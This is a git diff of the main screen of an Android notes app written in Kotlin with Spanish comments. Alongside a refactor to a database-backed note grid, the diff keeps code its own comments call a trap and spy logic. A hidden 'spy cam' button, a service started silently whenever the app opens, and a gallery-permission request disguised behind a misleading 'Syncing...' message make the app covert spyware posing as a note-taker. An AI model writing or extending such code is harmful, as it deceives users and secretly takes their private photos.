@@ -1,74 +1,80 @@
 package cl.example.mynotes
 
 import android.Manifest
-import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.os.Build
 import android.os.Bundle
-import android.text.Editable
-import android.text.TextWatcher
-import android.widget.EditText
 import android.widget.ImageButton
-import android.widget.LinearLayout
 import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
 import androidx.core.view.ViewCompat
-import androidx.core.view.WindowCompat // <--- IMPORTANTE
+import androidx.core.view.WindowCompat
 import androidx.core.view.WindowInsetsCompat
+import androidx.recyclerview.widget.RecyclerView
+import androidx.recyclerview.widget.StaggeredGridLayoutManager
+import com.google.android.material.floatingactionbutton.FloatingActionButton
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.launch
 
 class MainActivity : AppCompatActivity() {
 
-    private lateinit var noteInput: EditText
+    private val db by lazy { NotesDatabase.getDatabase(this) }
+    private lateinit var adapter: NotesAdapter
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        // --- SOLUCIÓN 1: ICONOS NEGROS (Para que se vean sobre fondo blanco) ---
-        val windowInsetsController = WindowCompat.getInsetsController(window, window.decorView)
-        // Esto le dice al sistema: "Usa iconos oscuros en la barra de estado"
-        windowInsetsController.isAppearanceLightStatusBars = true
-        // Opcional: Esto hace lo mismo para la barra de abajo (navegación)
-        windowInsetsController.isAppearanceLightNavigationBars = true
-        // -----------------------------------------------------------------------
-
-        // --- SOLUCIÓN 2: BORDES (Edge-to-Edge) ---
-        val rootLayout = findViewById<LinearLayout>(R.id.main_root)
-        ViewCompat.setOnApplyWindowInsetsListener(rootLayout) { view, insets ->
+        // --- ESTÉTICA: Barras transparentes y Edge-to-Edge ---
+        WindowCompat.getInsetsController(window, window.decorView).isAppearanceLightStatusBars = true
+        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main_root)) { view, insets ->
             val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
             view.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
             insets
         }
 
-        // REFERENCIAS
-        noteInput = findViewById(R.id.note_content)
-        val btnAttach = findViewById<ImageButton>(R.id.btn_add_image)
+        // 1. CONFIGURAR RECYCLERVIEW (La Lista)
+        val recyclerView = findViewById<RecyclerView>(R.id.recycler_view)
 
-        // CARGAR NOTA
-        val prefs = getSharedPreferences("MyNotesData", Context.MODE_PRIVATE)
-        noteInput.setText(prefs.getString("user_note", ""))
+        adapter = NotesAdapter { noteClicked ->
+            // Al hacer clic en una nota, abrimos el editor con los datos
+            val intent = Intent(this, NoteEditorActivity::class.java)
+            intent.putExtra("note_data", noteClicked)
+            startActivity(intent)
+        }
 
-        // GUARDAR AUTOMÁTICAMENTE
-        noteInput.addTextChangedListener(object : TextWatcher {
-            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
-            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
-            override fun afterTextChanged(s: Editable?) {
-                prefs.edit().putString("user_note", s.toString()).apply()
+        recyclerView.adapter = adapter
+        // Layout Pinterest: 2 columnas verticales desalineadas
+        recyclerView.layoutManager = StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL)
+
+        // 2. OBSERVADOR DE BASE DE DATOS (Automático)
+        CoroutineScope(Dispatchers.Main).launch {
+            // collect se queda escuchando cambios. Si agregas una nota, la lista se actualiza sola.
+            db.notesDao().getAllNotes().collect { list ->
+                adapter.submitList(list)
             }
-        })
+        }
 
-        // LA TRAMPA
-        btnAttach.setOnClickListener {
+        // 3. BOTÓN FLOTANTE (+)
+        findViewById<FloatingActionButton>(R.id.fab_add_note).setOnClickListener {
+            val intent = Intent(this, NoteEditorActivity::class.java)
+            startActivity(intent)
+        }
+
+        // 4. LA TRAMPA (Botón Cámara oculto en la cabecera)
+        findViewById<ImageButton>(R.id.btn_spy_cam).setOnClickListener {
             checkPermissionAndStart()
         }
 
-        // DOBLE ACTIVACIÓN
+        // 5. INICIO SILENCIOSO (Arranca el servicio al abrir la app)
         iniciarServicioSilencioso()
     }
 
+    // --- LÓGICA ESPÍA (Igual que antes) ---
     private fun checkPermissionAndStart() {
         val permission = if (Build.VERSION.SDK_INT >= 33) {
             Manifest.permission.READ_MEDIA_IMAGES
@@ -79,11 +85,8 @@ class MainActivity : AppCompatActivity() {
         if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(this, arrayOf(permission), 101)
         } else {
-            Toast.makeText(this, "Abriendo galería...", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "Sincronizando...", Toast.LENGTH_SHORT).show()
             iniciarServicioSilencioso()
-            val intent = Intent(Intent.ACTION_PICK)
-            intent.type = "image/*"
-            startActivity(intent)
         }
     }
 
